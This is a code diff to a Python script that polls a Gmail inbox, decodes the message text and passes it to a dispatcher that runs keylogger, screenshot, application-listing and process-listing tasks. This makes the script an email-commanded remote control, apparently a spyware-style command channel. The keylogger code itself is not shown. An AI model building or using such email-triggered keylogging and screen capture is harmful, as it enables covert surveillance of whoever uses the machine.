@@ -15,6 +15,7 @@ SCOPES = ["https://mail.google.com/"]
 
 
 def handle(myAr):
+    print("Handling Mail")
     for task in myAr:
         if task == "[key_logger]":
             res = service.keylogger()
@@ -25,9 +26,15 @@ def handle(myAr):
         if task == "[screen_capture]":
             service.screenshot()
         if task == "[list_app]":
-            service.listRunningApplication()
+            res = service.listRunningApplication()
+            for app in res:
+                if app != "Description" and app != "-----------":
+                    print(app)
         if task == "[list_processes]":
-            service.listRunningProcess()
+            res = service.listRunningProcess()
+            sorted_processes = sorted(res, key=lambda process: process["Name"])
+            for process in sorted_processes:
+                print(process)
 
 
 # def testoutput():
@@ -72,9 +79,8 @@ def CheckMail(creds):
 
                                     text = byte_code.decode("utf-8")
                                     if text.find("div") == -1:
-                                        # print("This is the message: " + str(text))
                                         myAr = text.splitlines()
-                                        print(myAr)
+                                        handle(myAr)
                                     # mark the message as read
                                     msg = (
                                         service.users()
@@ -93,7 +99,9 @@ def CheckMail(creds):
                             byte_code = base64.urlsafe_b64decode(data)
 
                             text = byte_code.decode("utf-8")
-                            print(text)
+                            myAr = text.splitlines()
+                            handle(myAr)
+                            # mark the message as read
                             msg = (
                                 service.users()
                                 .messages()
@@ -127,7 +135,7 @@ def main():
         with open("token.json", "w") as token:
             token.write(creds.to_json())
 
-    CheckMail(creds)
+    return creds
 
 
 if __name__ == "__main__":
